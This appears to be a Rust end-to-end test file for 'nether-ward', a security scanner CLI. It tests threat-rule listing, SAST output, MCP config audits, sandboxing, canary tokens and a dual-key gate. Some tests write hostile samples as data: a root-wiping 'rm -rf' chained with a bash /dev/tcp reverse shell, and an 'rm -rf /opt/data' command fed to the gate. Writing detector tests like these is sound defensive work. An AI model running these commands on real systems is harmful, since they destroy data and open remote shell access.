use std::fs;
use std::process::Command;

#[test]
fn test_e2e_cli_help() {
    let bin = env!("CARGO_BIN_EXE_nether-ward");
    let output = Command::new(bin)
        .arg("--help")
        .output()
        .expect("Failed to execute nether-ward binary");

    assert!(output.status.success());
    let stdout = String::from_utf8_lossy(&output.stdout);
    assert!(stdout.contains("Static security scanner"));
    assert!(stdout.contains("threat"));
    assert!(stdout.contains("gateway"));
    assert!(stdout.contains("mcp"));
    assert!(stdout.contains("redteam"));
    assert!(stdout.contains("sandbox"));
}

#[test]
fn test_e2e_cli_threat_rules_listing() {
    let bin = env!("CARGO_BIN_EXE_nether-ward");
    let output = Command::new(bin)
        .args(["threat", "--rules"])
        .output()
        .expect("Failed to execute nether-ward binary");

    assert!(output.status.success());
    let stdout = String::from_utf8_lossy(&output.stdout);
    assert!(stdout.contains("NW-SEC-001"));
    assert!(stdout.contains("NW-SYS-001"));
    assert!(stdout.contains("NW-CODE-001"));
    assert!(stdout.contains("NW-INJ-001"));
    assert!(stdout.contains("NW-OBF-001"));
    assert!(stdout.contains("NW-OBF-002"));
}

#[test]
fn test_e2e_cli_threat_sample_analysis_clean_and_malicious() {
    let bin = env!("CARGO_BIN_EXE_nether-ward");
    let temp_dir = std::env::temp_dir().join(format!("cli_threat_test_{}", std::process::id()));
    fs::create_dir_all(&temp_dir).unwrap();

    // 1. Clean sample should exit with code 0
    let clean_sample = temp_dir.join("clean.rs");
    fs::write(
        &clean_sample,
        "fn calculate(a: i32, b: i32) -> i32 { a * 2 + b }\n",
    )
    .unwrap();

    let clean_output = Command::new(bin)
        .args(["threat", "--sample", clean_sample.to_str().unwrap()])
        .output()
        .expect("Failed to execute nether-ward binary");

    assert!(
        clean_output.status.success(),
        "Clean sample should exit with code 0"
    );
    let clean_stdout = String::from_utf8_lossy(&clean_output.stdout);
    assert!(clean_stdout.contains("Entropy"));
    assert!(clean_stdout.contains("CLEAN"));

    // 2. Malicious sample should exit with code 2 (threat detected)
    let malicious_sample = temp_dir.join("malicious.sh");
    fs::write(
        &malicious_sample,
        "#!/bin/bash\nrm -rf / --no-preserve-root && bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n",
    )
    .unwrap();

    let mal_output = Command::new(bin)
        .args(["threat", "--sample", malicious_sample.to_str().unwrap()])
        .output()
        .expect("Failed to execute nether-ward binary");

    assert_eq!(
        mal_output.status.code(),
        Some(2),
        "Threat scanner must exit with code 2 on critical indicators"
    );
    let mal_stdout = String::from_utf8_lossy(&mal_output.stdout);
    assert!(mal_stdout.contains("CRITICAL") || mal_stdout.contains("HIGH"));

    let _ = fs::remove_dir_all(&temp_dir);
}

#[test]
fn test_e2e_cli_threat_sast_json() {
    let bin = env!("CARGO_BIN_EXE_nether-ward");
    let temp_dir = std::env::temp_dir().join(format!("cli_sast_test_{}", std::process::id()));
    fs::create_dir_all(&temp_dir).unwrap();

    let sample_file = temp_dir.join("vulnerable.sh");
    fs::write(&sample_file, "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n").unwrap();

    let output = Command::new(bin)
        .args(["threat", "--sast", temp_dir.to_str().unwrap(), "--json"])
        .output()
        .expect("Failed to execute nether-ward binary");

    // Scanner exits with code 2 when critical vulnerabilities are present
    assert_eq!(output.status.code(), Some(2));
    let stdout = String::from_utf8_lossy(&output.stdout);
    let parsed: serde_json::Value =
        serde_json::from_str(&stdout).expect("CLI --json output must be valid JSON");
    assert!(parsed.get("total_findings").is_some());
    assert!(parsed["critical_count"].as_u64().unwrap() > 0);

    let _ = fs::remove_dir_all(&temp_dir);
}

#[test]
fn test_e2e_cli_mcp_audit() {
    let bin = env!("CARGO_BIN_EXE_nether-ward");
    let temp_dir = std::env::temp_dir().join(format!("cli_mcp_test_{}", std::process::id()));
    fs::create_dir_all(&temp_dir).unwrap();

    let clean_config = temp_dir.join("mcp_config.json");
    let config_data = serde_json::json!({
        "mcpServers": {
            "git-server": {
                "command": "git",
                "args": ["status"]
            }
        }
    });
    fs::write(&clean_config, config_data.to_string()).unwrap();

    let output = Command::new(bin)
        .args(["mcp", "--config", clean_config.to_str().unwrap()])
        .output()
        .expect("Failed to execute nether-ward binary");

    assert!(output.status.success());
    let stdout = String::from_utf8_lossy(&output.stdout);
    assert!(stdout.contains("MODEL CONTEXT PROTOCOL (MCP) SECURITY AUDIT"));
    assert!(stdout.contains("CLEAN"));

    let _ = fs::remove_dir_all(&temp_dir);
}

#[test]
fn test_e2e_cli_sandbox_dry_run() {
    let bin = env!("CARGO_BIN_EXE_nether-ward");
    let output = Command::new(bin)
        .args([
            "sandbox",
            "--dry-run",
            "--no-network",
            "--",
            "echo",
            "sandbox_dry_run",
        ])
        .output()
        .expect("Failed to execute nether-ward binary");

    assert!(output.status.success());
    let stdout = String::from_utf8_lossy(&output.stdout);
    assert!(stdout.contains("NETHER WARD SANDBOX SPECIFICATION (DRY RUN)"));
    assert!(stdout.contains("Target Command: echo sandbox_dry_run"));
}

#[test]
fn test_e2e_cli_sandbox_execution() {
    let bin = env!("CARGO_BIN_EXE_nether-ward");
    let output = Command::new(bin)
        .args(["sandbox", "--json", "--", "echo", "e2e_sandbox_alive"])
        .output()
        .expect("Failed to execute nether-ward binary");

    assert!(output.status.success());
    let stdout = String::from_utf8_lossy(&output.stdout);
    let parsed: serde_json::Value = serde_json::from_str(&stdout).expect("Valid JSON output");
    assert_eq!(parsed["success"], true);
    assert_eq!(parsed["exit_code"], 0);
    assert_eq!(parsed["command"], "echo");
}

#[test]
fn test_e2e_cli_canary_generation_and_scan() {
    let bin = env!("CARGO_BIN_EXE_nether-ward");

    // 1. Generate an AWS canary token
    let gen_output = Command::new(bin)
        .args(["canary", "generate", "-t", "aws", "--json"])
        .output()
        .expect("Failed to execute nether-ward canary generate");

    assert!(gen_output.status.success());
    let gen_stdout = String::from_utf8_lossy(&gen_output.stdout);
    let token_json: serde_json::Value =
        serde_json::from_str(&gen_stdout).expect("Valid JSON token output");
    let token_val = token_json["value"].as_str().expect("Token value string");
    assert!(token_val.starts_with("AKIA_CANARY_"));

    // 2. Scan clean string -> exit 0
    let clean_scan = Command::new(bin)
        .args(["canary", "scan", "--payload", "normal system prompt"])
        .output()
        .expect("Failed to execute nether-ward canary scan");
    assert!(clean_scan.status.success());

    // 3. Scan leaked canary token -> exit 1
    let breach_payload = format!("Leaked token: {}", token_val);
    let breach_scan = Command::new(bin)
        .args(["canary", "scan", "--payload", &breach_payload])
        .output()
        .expect("Failed to execute nether-ward canary scan");
    assert!(!breach_scan.status.success());
}

#[test]
fn test_e2e_cli_gate_dual_key_authorization() {
    let bin = env!("CARGO_BIN_EXE_nether-ward");

    // 1. Irreversible action without token -> blocked (exit 1)
    let block_output = Command::new(bin)
        .args(["gate", "--command", "rm -rf /opt/data", "--json"])
        .output()
        .expect("Failed to execute nether-ward gate");
    assert!(!block_output.status.success());

    // 2. Generate dual-key token
    let token_output = Command::new(bin)
        .args(["gate", "--generate-token", "--json"])
        .output()
        .expect("Failed to generate dual key token");
    assert!(token_output.status.success());
    let token_stdout = String::from_utf8_lossy(&token_output.stdout);
    let token_json: serde_json::Value =
        serde_json::from_str(&token_stdout).expect("Valid token JSON");
    let token_str = token_json["token"].as_str().expect("Token string");

    // 3. Irreversible action with valid token -> approved (exit 0)
    let approve_output = Command::new(bin)
        .args([
            "gate",
            "--command",
            "rm -rf /opt/data",
            "--token",
            token_str,
            "--json",
        ])
        .output()
        .expect("Failed to evaluate gate with token");
    assert!(approve_output.status.success());
    let approve_stdout = String::from_utf8_lossy(&approve_output.stdout);
    let approve_json: serde_json::Value =
        serde_json::from_str(&approve_stdout).expect("Valid approved JSON");
    assert_eq!(approve_json["status"], "approved");

    // 4. Benign command -> approved without token
    let benign_output = Command::new(bin)
        .args(["gate", "--command", "ls -la /var/log", "--json"])
        .output()
        .expect("Failed to evaluate benign gate command");
    assert!(benign_output.status.success());
}
